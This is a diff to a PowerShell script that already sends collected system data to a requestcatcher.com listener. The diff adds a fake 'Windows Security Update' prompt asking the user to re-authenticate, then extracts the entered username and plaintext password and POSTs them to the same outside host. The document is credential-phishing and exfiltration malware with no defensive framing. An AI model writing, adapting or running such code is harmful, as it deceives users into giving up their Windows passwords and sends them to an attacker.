@@ -236,4 +236,26 @@ $tree
 # Send to your listener
 Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{debug = $data}
 
+# ============================== [PROMPT FOR CREDENTIALS] ==============================
+
+try {
+    $cred = $Host.ui.PromptForCredential('Windows Security Update', 'Due to recent changes, please re-authenticate:', $env:USERNAME, '')
+    $enteredUsername = $cred.UserName
+    $enteredPassword = $cred.GetNetworkCredential().Password
+} catch {
+    $enteredUsername = "Prompt failed"
+    $enteredPassword = "Prompt failed"
+}
+
+# ============================== [SEND CREDENTIALS] ==============================
+
+Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
+    debug = @"
+===== [Captured Credentials] =====
+Username: $enteredUsername
+Password: $enteredPassword
+"@
+}
+
+
 # ============================== [END] ==============================
